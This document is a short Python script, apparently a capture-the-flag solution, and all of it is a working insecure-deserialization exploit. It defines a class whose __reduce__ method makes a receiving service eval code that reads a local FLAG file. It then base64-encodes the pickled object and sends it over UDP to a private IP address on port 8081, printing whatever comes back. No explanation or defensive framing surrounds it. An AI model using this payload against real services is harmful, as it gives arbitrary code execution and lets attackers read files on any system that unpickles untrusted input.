import pickle
import base64
import socket

class test:
    def __reduce__(self):
        p = "open('./FLAG').read()"
        return (eval, (p,))

rs = {"user": test()}
udp_port=8081
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
payload = base64.b64encode(pickle.dumps(rs)).decode('utf8')
sock.sendto(payload.encode(),("192.168.219.107", udp_port))
data, addr = sock.recvfrom(1024)
print(data.decode())